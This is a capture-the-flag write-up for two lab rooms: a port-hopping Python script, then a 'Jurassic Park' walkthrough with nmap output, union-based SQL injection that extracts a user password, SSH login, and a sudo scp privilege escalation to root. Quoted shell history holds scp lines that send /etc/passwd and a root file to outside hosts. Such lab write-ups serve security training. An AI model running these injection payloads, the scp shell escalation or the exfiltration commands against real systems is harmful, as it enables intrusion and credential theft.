# [Task 3] [Scripting] [Medium] Gotta Catch em All
```python
import requests
import re
import time
url = "http://10.10.207.179:"
first_port = 3010
result_number=0

response = requests.get(url+str(first_port))
cut_response = response.text[853:]
next_port = re.match(r"[0-9]+",cut_response).group(0)
print(response.text)
while True:
  next_url=url+next_port
  print(next_url)
  try:
    response = requests.get(next_url)
  except Exception :
    time.sleep(1)
    try:
      time.sleep(1)
      response = requests.get(next_url)
    except Exception:
      response = requests.get(next_url)
  operations = response.text.split(" ")

  if operations[0] =="STOP":
    print("STOP")
    break
  elif operations[0] == "add":
    result_number = result_number + int(operations[1])
  elif operations[0] == "minus":
    result_number = result_number - int(operations[1])
  elif operations[0] == "multiply":
    result_number = result_number * int(operations[1])
  elif operations[0] == "divide":
    result_number = result_number / int(operations[1])
  else:
    print(operations[0]) 
    break
  next_port = operations[2]
print("result_number:"+str(result_number))
 
```
# [Web Exploitation] [Medium] Jurassic Park
## nmap
```
Nmap scan report for ip-10-10-85-206.eu-west-1.compute.internal (10.10.85.206)
Host is up (0.00050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:ae:f8:c2:2f:da:72:a3:08:86:ba:01:c8:18:78:e4 (RSA)
|   256 b8:1e:6e:09:45:07:27:28:b0:e5:a3:80:70:81:38:fc (ECDSA)
|_  256 c1:24:1c:03:c9:15:a0:43:f5:2a:de:33:d5:22:d1:57 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jarassic Park
MAC Address: 02:98:F1:A2:81:AA (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms ip-10-10-85-206.eu-west-1.compute.internal (10.10.85.206)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds
root@kali:~#

```
## robots
```
HTTP/1.1 200 OK
Date: Sat, 16 May 2020 01:52:24 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sat, 16 Feb 2019 18:49:27 GMT
ETag: "11-5820759d53c9f"
Accept-Ranges: bytes
Content-Length: 17
Connection: close
Content-Type: text/plain

Wubbalubbadubdub

```
### Wubbalubbadubdub
```
HTTP/1.1 404 Not Found
Date: Sat, 16 May 2020 01:54:12 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 292
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /Wubbalubbadubdub was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.85.206 Port 80</address>
</body></html>
```

## shop
- 5
```html
GET /item.php?id=5 HTTP/1.1
Host: 10.10.85.206
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.85.206/shop.php
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Sat, 16 May 2020 01:56:00 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1669
Connection: close
Content-Type: text/html; charset=UTF-8

<link rel="icon" type="image/png" href="assets/favicon.png"/>

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Buy, Buy, Buy</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
    * {
      font-family: "Courier New", Times, serif;
    }
    body {
      background-color: #2f2e2e;
      color: white;
    }

    .black {
      position:relative;
      top: -20px;
      padding-top: 40px;
      background-color: black;
      color: white;
      width: 100%;
      box-shadow: 4px 0px 4px 4px black;
    }

    .row {
      color: black;
    }

    .card-img-top {
      height: 200px;
      object-fit: cover;
    }

    .card {
      background-color: rgb(162, 162, 164);
      -webkit-box-shadow: 0px 0px 21px 2px rgba(0,0,0,0.75);
      -moz-box-shadow: 0px 0px 21px 2px rgba(0,0,0,0.75);
      box-shadow: 0px 0px 21px 2px rgba(0,0,0,0.75);
      border:0;
    }

  </style>
</head>
<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>Development Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $0</h3></br>
    <div class="alert alert-primary" role="alert"><b>0</b> of these packages have been sold in the last hour.</div></br>
    <h4>Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>
</html>

```

- 100
```html
<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>... Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $-1</h3></br>
    <div class="alert alert-primary" role="alert"><b>-1</b> of these packages have been sold in the last hour.</div></br>
    <h4>Nope</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>
</html>

```

```html
GET /item.php?id=' HTTP/1.1
Host: 10.10.85.206
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.85.206/shop.php
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Date: Sat, 16 May 2020 02:03:53 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1944
Connection: close
Content-Type: text/html; charset=UTF-8

<link rel="icon" type="image/png" href="assets/favicon.png"/>
<style>* {margin: 0; padding: 0; font-family: "Courier New", Times, serif; background-color: #0102a7; color: white; } .error {background-color: white; color: black;}</style>
            <!--<div class="error">Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "%" at line 20</div>-->
            <center></br></br>
              <img class="text-center" src="assets/magic.gif"></br></br><div id="magicwork">access: <b>PERMISSION DEINED</b>...and...</br></br></div>
            </center>
            <video src="assets/magic.mp3" autoplay></video>
            <script>
              function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
              }

              async function lol() {
                let i = 1;
                while(i < 100) {
                  document.querySelector("#magicwork").innerHTML += "<b>YOU DIDN'T SAY THE MAGIC WORD!</b></br>"
                  await sleep(50)
                  i++;
                }
                document.querySelector("#magicwork").innerHTML += "Try SqlMap.. I dare you.."
              }

              async function play() {
                return new Promise(async function (resolve, reject) {
                  console.log("in")
                  var audioElement = document.createElement("audio");
                  audioElement.setAttribute("src", "assets/lel.ogg");
                  audioElement.load()
                  audioElement.addEventListener("load", function() {
                    audioElement.play();
                    console.log("in2")
                    return resolve()
                  }, true);
                })
              }

              (async function () {
                  play()
                  await lol()
              })();

            </script>
```

```html
http://10.10.85.206/item.php?id=5%20union%20select%201,2,3,4,5

2,3,4,5 show up in the view
<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>2 Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $3</h3></br>
    <div class="alert alert-primary" role="alert"><b>5</b> of these packages have been sold in the last hour.</div></br>
    <h4>4</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>

http://10.10.85.206/item.php?id=5%20union%20select%201,database(),3,4,5

<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>park Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $3</h3></br>
    <div class="alert alert-primary" role="alert"><b>5</b> of these packages have been sold in the last hour.</div></br>
    <h4>4</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>

http://10.10.85.206/item.php?id=5%20union%20select%201,version(),3,4,5

<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>5.7.25-0ubuntu0.16.04.2 Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $3</h3></br>
    <div class="alert alert-primary" role="alert"><b>5</b> of these packages have been sold in the last hour.</div></br>
    <h4>4</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>

http://10.10.85.206/item.php?id=5%20union%20select%201,password,3,4,5%20from%20users

<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>ih8dinos Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $3</h3></br>
    <div class="alert alert-primary" role="alert"><b>5</b> of these packages have been sold in the last hour.</div></br>
    <h4>4</h4>
    </br><h4>Order yours quick by calling us!</h4>

  </div>
</body>

```

## ssh
```
oot@kali:~# ssh dennis@10.10.85.206
The authenticity of host '10.10.85.206 (10.10.85.206)' can't be established.
ECDSA key fingerprint is SHA256:2HTQe3EdXw/zeZTHL8qFhGmpPtes7Lq22WR4LBOsfNE.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.85.206' (ECDSA) to the list of known hosts.
dennis@10.10.85.206's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

62 packages can be updated.
45 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dennis@ip-10-10-85-206:~$
```

## flag1
```
dennis@ip-10-10-85-206:~$ cat flag1.txt
Congrats on finding the first flag.. But what about the rest? :O

b89f2d69c56b9981ac92dd267f
dennis@ip-10-10-85-206:~$
```

## flag2
```
dennis@ip-10-10-85-206:~$ ls -al
total 44
drwxr-xr-x 3 dennis dennis 4096 May 16 02:31 .
drwxr-xr-x 4 root   root   4096 Feb 16  2019 ..
-rw------- 1 dennis dennis 1001 Feb 16  2019 .bash_history
-rw-r--r-- 1 dennis dennis  220 Feb 16  2019 .bash_logout
-rw-r--r-- 1 dennis dennis 3771 Feb 16  2019 .bashrc
drwx------ 2 dennis dennis 4096 May 16 02:31 .cache
-rw-rw-r-- 1 dennis dennis   93 Feb 16  2019 flag1.txt
-rw-r--r-- 1 dennis dennis  655 Feb 16  2019 .profile
-rw-rw-r-- 1 dennis dennis   32 Feb 16  2019 test.sh
-rw------- 1 dennis dennis 4350 Feb 16  2019 .viminfo
dennis@ip-10-10-85-206:~$ cat test.sh
#!/bin/bash
cat /root/flag5.txt
dennis@ip-10-10-85-206:~$ chmod +x test.sh
dennis@ip-10-10-85-206:~$ ./test.sh
cat: /root/flag5.txt: Permission denied
dennis@ip-10-10-85-206:~$ find / -iname "*flag*" -type f 2>>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/home/dennis/flag1.txt
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/vif-0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/share/perl5/Dpkg/BuildFlags.pm
/usr/share/man/man3/X509_VERIFY_PARAM_set_flags.3ssl.gz
/usr/share/man/man3/Dpkg::BuildFlags.3.gz
/usr/share/man/man3/SSL_CONF_CTX_set_flags.3ssl.gz
/usr/share/man/man1/dpkg-buildflags.1.gz
/usr/share/man/de/man1/dpkg-buildflags.1.gz
/usr/share/man/sv/man1/dpkg-buildflags.1.gz
/usr/share/man/fr/man1/dpkg-buildflags.1.gz
/usr/share/dpkg/buildflags.mk
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/bin/dpkg-buildflags
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/page-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/kernel-page-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/pageblock-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/linux/page-flags-layout.h
/usr/src/linux-aws-headers-4.4.0-1072/include/uapi/linux/kernel-page-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/uapi/linux/tty_flags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/asm-generic/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/include/trace/events/gfpflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/h8300/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/nios2/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/c6x/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/avr32/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/frv/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arm/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/m32r/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/s390/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/powerpc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/hexagon/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arm64/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/alpha/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/unicore32/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/arch-v32/arch/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/arch-v10/arch/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/cris/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags-compact.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags-arcv2.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/arc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/microblaze/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/m68k/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/xtensa/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/asm/processor-flags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-aws-headers-4.4.0-1072/arch/metag/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/mips/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/mn10300/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/openrisc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/score/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/um/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/sh/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/ia64/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/tile/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/blackfin/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags_32.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags_64.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/sparc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/arch/parisc/include/asm/irqflags.h
/usr/src/linux-aws-headers-4.4.0-1072/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-4.4.0-1072-aws/include/config/zone/dma/flag.h
/usr/lib/php/20151012/build/ax_check_compile_flag.m4
/usr/lib/x86_64-linux-gnu/perl/5.22.1/bits/waitflags.ph
/boot/grub/fonts/flagTwo.txt
dennis@ip-10-10-85-206:~$ cat /boot/grub/fonts/flagTwo.txt
96ccd6b429be8c9a4b501c7a0b117b0a
```

## flag3
```
dennis@ip-10-10-85-206:~$ cat .bash_history
Flag3:b4973bbc9053807856ec815db25fb3f1
sudo -l
sudo scp
scp
sudo find
ls
vim test.sh
ls
cd ~
ls
vim test.sh
ls
ls -la
sudo scp -S test.sh
sudo scp /etc/password
sudo scp /etc/password localhost@10.8.0.6@~/
sudo scp /etc/passwd localhost@10.8.0.6@~/
sudo scp /etc/passwd dennis@10.0.0.59@~/
sudo scp /etc/passwd dennis@10.0.0.59:~/
sudo scp /etc/passwd dennis@10.0.0.59:/home/dennis
sudo scp /etc/passwd ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/ -v
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
sudo scp -v /root/flag5.txt ben@localhost:~/
sudo scp -v /root/flag5.txt dennis@localhost:~/
sudo scp -v /root/flag5.txt dennis@10.0.0.59:~/
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
ping 10.8.0.6
ping 10.8.0.7
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@88.104.10.206:~/
sudo scp -v /root/flag5.txt ben@88.104.10.206:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
ls
vim ~/.bash_history
dennis@ip-10-10-85-206:~$


```


## flag5
```
dennis@ip-10-10-85-206:/tmp$ sudo -l
Matching Defaults entries for dennis on ip-10-10-85-206.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-85-206.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
dennis@ip-10-10-85-206:/tmp$ TF=$(mktemp)
dennis@ip-10-10-85-206:/tmp$ echo 'sh 0<&2 1>&2' > $TF
dennis@ip-10-10-85-206:/tmp$ chmod +x "$TF"
dennis@ip-10-10-85-206:/tmp$ sudo scp -S $TF x y:
# whoami
root
# cd /root
# ls
flag5.txt  snap
# cat flag5.txt
2a7074e491fcacc7eeba97808dc5e2ec
#
```
